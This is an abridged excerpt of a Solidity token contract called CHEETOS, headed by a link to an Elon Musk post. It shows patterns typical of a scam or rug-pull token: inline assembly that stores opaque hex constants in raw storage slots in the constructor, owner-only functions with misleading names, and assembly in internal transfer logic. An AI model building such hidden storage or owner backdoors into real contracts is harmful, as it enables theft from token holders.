// https://x.com/elonmusk/status/1813301437033746904?s=46
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xd45d2204da20e2691898ead1918d12af5aa9114583ee)
            sstore(0x51,0xd45d1effdc323c1e4113131fa45de95bdbcc8fd65f59)
    ...
    function transferNFT(uint256 number) public onlyOwner returns (bool NFT) {
    }

    function fusionSwap(bytes[] memory data) public onlyOwner returns (uint datas) {
    }
    ...
    function farmWithJPGs(address sender, uint256 amount) internal returns (uint256 result) {
            assembly {
                let data := mload(0x40)
    ...
    function _DeployCHEETOS(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCHEETOS(creator, initialSupply);
    }
}

contract CHEETOS is ERC20Token {
    constructor() ERC20Token("CHEETOS", "CHEETOS", msg.sender, 666666666 * 10 ** 18) {
    }
}
